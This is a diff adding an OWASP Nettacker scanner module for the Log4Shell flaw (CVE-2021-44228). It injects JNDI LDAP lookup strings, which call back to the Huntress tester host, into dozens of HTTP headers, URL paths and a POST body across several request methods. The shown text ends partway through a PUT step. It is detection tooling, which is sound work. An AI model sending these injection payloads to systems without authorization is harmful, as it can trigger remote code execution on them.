@@ -1,0 +1,661 @@
+info:
+  name: log4j_cve_2021_44228_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: Log4J Remote Code Execution
+  reference:
+    - https://log4shell.huntress.com/
+    - https://github.com/huntresslabs/log4shell-tester
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve2021
+    - cve
+    - log4j
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+           User-Agent: "{user_agent}"
+        url: "https://log4shell.huntress.com/"
+        response:
+          save_to_temp_events_only: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: <code>(.*)</code>\.
+              reverse: false
+            status_code:
+              regex: "200"
+              reverse: false
+
+      - method: get
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk1
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: options
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk2
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: head
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk3
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: post
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data:
+          junk: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+        response:
+          save_to_temp_events_only: log4shell_junk4
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+
+      - method: put
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
